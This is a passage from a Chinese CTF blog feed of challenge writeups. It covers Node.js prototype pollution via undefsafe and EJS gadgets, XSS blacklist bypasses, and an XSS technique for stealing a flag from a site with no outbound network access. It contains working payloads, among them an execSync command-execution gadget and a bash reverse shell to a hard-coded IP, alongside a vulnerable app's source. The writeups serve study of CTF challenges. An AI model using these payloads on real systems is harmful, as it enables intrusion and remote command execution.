title="*修正"></a>*修正</h2><ol><li>思路没有错就胜利很多了</li><li>fix1: 这里的<strong>访问属性调用函数有问题</strong><ol><li>payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code>这样来调用，插入模板进行调用，反而如果直接定义函数的的话无法被调用</li></ol></li><li>fix2: 注意传输json对象时要<strong>修改content-type: application&#x2F;json</strong></li></ol><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ol><li>注册<code>admın</code>成功进行覆盖</li><li>访问<code>/action</code>并进行覆盖，payload<code>&#123;&quot;lua&quot;:&quot;123&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;t=1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;).toString()//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code></li><li>访问<code>/info</code></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>几个核心思想<ol><li>读文件一般需要命令或者包含</li><li>进行了什么处理(从处理想对策)如uppercase</li><li>这种源码路由题还是先从路由再到细节想思路，不会太跳跃</li></ol></li><li>ref<ol><li><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">p神的js toUpperCase绕过</a></li><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notes_网鼎20</title>
      <link href="/2024/10/30/notes_%E7%BD%91%E9%BC%8E20/"/>
      <url>/2024/10/30/notes_%E7%BD%91%E9%BC%8E20/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现平台: buuoj</p></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>分析源码，目标肯定是&#x2F;status的地方<ol><li><code>let in</code>语句<strong>可以读取原型链的内容</strong>，构造payload<code>&quot;rce&quot;: &quot;ls&quot;</code> –&gt; <strong>需要考虑进行带外，因为是输出到标准输出</strong></li><li>可以考虑构造原型链到Object里，有两个目标<ol><li><p>一个是edit_note</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payloads，可以使用反弹shell实现，本地nc -lvnp 8080</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>:<span class="string">&quot;__proto__.b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/8.218.92.67/8080 0&gt;&amp;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;raw&quot;</span> : <span class="string">&quot;h3110 w0r1d&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>一个是write_note</p></li></ol></li></ol></li></ol><h2 id="直接源码"><a href="#直接源码" class="headerlink" title="直接源码"></a>直接源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Notes</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">owner</span> = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span> = &#123;&#125;;    <span class="comment">// 定义了一个字典，在后面的攻击过程中会用到</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">write_note</span>(<span class="params">author, raw_note</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span>[(<span class="variable language_">this</span>.<span class="property">num</span>++).<span class="title function_">toString</span>()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        <span class="title function_">undefsafe</span>(r, id, <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit_note</span>(<span class="params">id, author, raw</span>) &#123;</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_all_notes</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">note_list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">remove_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">note_list</span>[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> <span class="title class_">Notes</span>();</span><br><span class="line">notes.<span class="title function_">write_note</span>(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);    <span class="comment">// 设置模板引擎为pug</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> raw = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.<span class="title function_">write_note</span>(author, raw);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/edit_note&#x27;</span>)    <span class="comment">// 该路由中 undefsafe 三个参数均可控</span></span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> enote = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.<span class="title function_">edit_note</span>(id, author, enote);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.<span class="title function_">remove_note</span>(id);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_all_notes</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_note</span>(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/status&#x27;</span>)    <span class="comment">// 漏洞点，只要将字典 commands 给污染了, 就能任意执行我们的命令</span></span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="title function_">exec</span>(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);    <span class="comment">// 将命令执行结果输出</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">stack</span>);</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><h2 id="为什么不是write-note"><a href="#为什么不是write-note" class="headerlink" title="*为什么不是write_note?"></a>*为什么不是write_note?</h2><ol><li>这里不行，就算传入<code>__proto__</code>也无法污染原型链，而是直接替换对象，只有在<code>undefsafe()</code>中才可以添加属性进行污染</li></ol><h2 id="undefsafe的原型链污染"><a href="#undefsafe的原型链污染" class="headerlink" title="*undefsafe的原型链污染"></a>*undefsafe的原型链污染</h2><ol><li>介绍：Undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性</li><li>速记<ol><li>低版本&lt;2.0.3</li><li>undefsafe用来修改&#x2F;添加属性时防止报错</li><li>2.0.3一下如果当属性不存在时，我们想对该属性赋值，访问属性会在上层进行创建并赋值</li></ol></li><li><a href="https://www.anquanke.com/post/id/242645">例子</a></li></ol><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>直接见script notes_wangding20</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss_payload</title>
      <link href="/2024/10/30/xss_payload/"/>
      <url>/2024/10/30/xss_payload/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://xz.aliyun.com/t/12890?time__1311=GqGxuDc7iQGQitD/Y2PBKq2UiA+2AEbD">xss进阶原理</a></li></ol><h2 id="T00ls"><a href="#T00ls" class="headerlink" title="T00ls"></a>T00ls</h2><h2 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h2><ol><li>带外，一般不行不出网</li><li>cookie，需要cookie不是httponly</li><li><strong>写入载体</strong></li></ol><h2 id="关键词黑名单"><a href="#关键词黑名单" class="headerlink" title="关键词黑名单"></a>关键词黑名单</h2><ol><li><p>执行代码<code>window[&#39;eval&#39;](atob(data))</code></p><ol><li>绕过安全检查：有些网站或应用可能会禁用或重写 eval 函数以防止潜在的安全风险。通过使用 <code>window[&#39;eval&#39;]</code>，攻击者可以尝试绕过这种检查</li><li>使用<code>atob(data)</code>进行base64解码</li></ol></li><li><p>实体编码绕过</p><ol><li>可以识别出是<code>data:text/javascript;base64,</code>，有条件还是本地多试试</li><li>详见绕过原理中的<code>html解码和js解码</code></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;<span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3b;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x2c;</span>YWxlcnQoKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>自动闭合特性：可以用于绕过一些正则表达式</p></li></ol><h2 id="一些绕过原理"><a href="#一些绕过原理" class="headerlink" title="一些绕过原理"></a>一些绕过原理</h2><h3 id="html解码和js解码"><a href="#html解码和js解码" class="headerlink" title="html解码和js解码"></a>html解码和js解码</h3><ol><li>解码顺序<ol><li>一般情况下，解码顺序是按照HTML实体化解码–&gt;JavaScript解码进行的</li></ol></li><li>HTML实体化解码<ol><li>如果服务器与客户端之间要传输某个特殊字符，像是<code>&lt;&gt;，&#39;</code>等这类会被当做标签或者属性值等来解析的字符，为了避免歧义就需要使用到HTML实体化编码来进行编码了。</li><li>HTML编码的几种方式<ol><li>别名形式：因为比较多可以见(w3school.com.cn)</li><li>十六进制：像<code>&lt;div&gt;</code>就会被编码为<code>&amp;#x003c;&amp;#x0064;&amp;#x0069;&amp;#x0076;&amp;#x003e;</code></li><li>十进制：上述标签在十进制会被编码为<code>&amp;#60;&amp;#100;&amp;#105;&amp;#118;&amp;#62;</code></li></ol></li></ol></li><li>为什么需要JavaScript解码？<ol><li>通过JavaScript编码，可以对特殊字符进行转义，防止数据在传输过程中产生语法错误或安全漏洞。例如，对于包含特殊字符（如引号、尖括号等）的数据，可以使用转义字符进行编码，以确保数据的完整性和安全性。</li></ol></li><li><em><strong>明明有了HTML实体化编码为什么是还需要JavaScript编码</strong></em><ol><li><p>在HTML进行解析的时候，遇到了<code>&lt;script&gt;</code>标签或者事件属性或者URL协议时就会使用到JS编码来对JS代码当中的特殊字符如<code>：&#39;，&quot;</code>进行编码操作。</p></li><li><p>JS编码有哪些方式？</p><ol><li>以\uxxxx，\UXXXXXXXX，\xXX都是JavaScript编码</li><li>但是注意：某些特殊字符不能够进行JavaScript编码，否则浏览器无法进行解析，如<code>&lt; &gt; &#39; &quot; ( )</code><ol><li>特别的：<code>&lt;svg&gt;</code>当中包裹的标签将特殊字符进行编码时可以进行解析</li></ol></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="comment">// js编码后</span></span><br><span class="line">&lt;img src=# onerror=\u0061\u006C\u0065\u0072\u0074(\u0031)&gt;</span><br><span class="line">// 因为()要进行保留，所以不是以下</span><br><span class="line">&lt;img src=# onerror=\u0061\u006C\u0065\u0072\u0074\u0031&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解码脚本如下</span></span><br><span class="line"><span class="comment"># 原始字符串</span></span><br><span class="line">encoded_string = <span class="string">&#x27;&lt;img src=# onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 Unicode 转义序列</span></span><br><span class="line">decoded_string = encoded_string.encode().decode(<span class="string">&#x27;unicode-escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decoded_string)</span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> payload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web02_网鼎24</title>
      <link href="/2024/10/29/web02_%E7%BD%91%E9%BC%8E24/"/>
      <url>/2024/10/29/web02_%E7%BD%91%E9%BC%8E24/</url>
      
        <content type="html"><![CDATA[<blockquote><p>也是更新我对带外的思考了</p></blockquote><h2 id="越权与带外"><a href="#越权与带外" class="headerlink" title="越权与带外"></a>越权与带外</h2><blockquote><p>没见过这种，开辟新思路了，还是做题不够多</p></blockquote><ol><li>没搞出来，dy牛，分析一下</li><li>第一波的&#x2F;flag纯靠经验猜，砂岩了，不过就算有也想不到这样</li><li>一眼注入回显型，xss和ssti，xss有点希望(boss会看，可以获取他的cookie)，但是bp collaborator和dnslog都不行，应该是不出网，不出网如何获取信息？而且这里&#x2F;flag有访问控制</li><li><em><strong>这里就来到今天的重点了</strong></em><ol><li>引入一个<strong>信道概念</strong>，从本质上看与网站交互的信道是单条的，带外是为了自己引进，如果带外不行的话，那如何在单条信道获取信息 -&gt; 对方返回的内容，这里最明显的就是todo，接下来就是要让对方携带cookie返回在todo里面</li><li><strong>访问控制</strong>: todo可以通过post进行修改，而且注意到每一个content都有一个对于的id -&gt; 通过boss可以访问到&#x2F;flag，然后插入到我的页面</li><li>payload: web02_js&#x2F;py_wangding24</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS原型链污染速通</title>
      <link href="/2024/10/28/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/"/>
      <url>/2024/10/28/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="1-DONE-Js中函数也是对象啊，他们的原型链怎么办"><a href="#1-DONE-Js中函数也是对象啊，他们的原型链怎么办" class="headerlink" title="1. DONE: Js中函数也是对象啊，他们的原型链怎么办?"></a>1. DONE: Js中函数也是对象啊，他们的原型链怎么办?</h3><ol><li>对于构造函数，更加准确是使用new调用时，func.prototype才能发挥他特有的作用，否则只是一个普通的属性</li><li><code>Constructor.prototype</code> 仅在构造实例时有用。它与 <code>Constructor.[[Prototype]]</code> 无关，后者是构造函数的自有原型，即 Function.prototype。也就是说，Object.getPrototypeOf(Constructor) &#x3D;&#x3D;&#x3D; Function.prototype</li></ol><h3 id="2-DONE-内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事"><a href="#2-DONE-内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事" class="headerlink" title="*2. DONE: 内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事?"></a>*2. DONE: 内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事?</h3><ol><li><p>默认情况下，构造函数的 prototype 是一个普通的对象，它的<code>[[Prototype]]</code>指向 Object.prototype</p><ol><li>普通对象的 <code>[[Prototype]]</code> 指向 Object.prototype。这是 JavaScript 中原型链机制的一个基本特性。每个通过<em><strong>对象字面量</strong></em>或***new Object()***创建的对象，默认情况下其内部 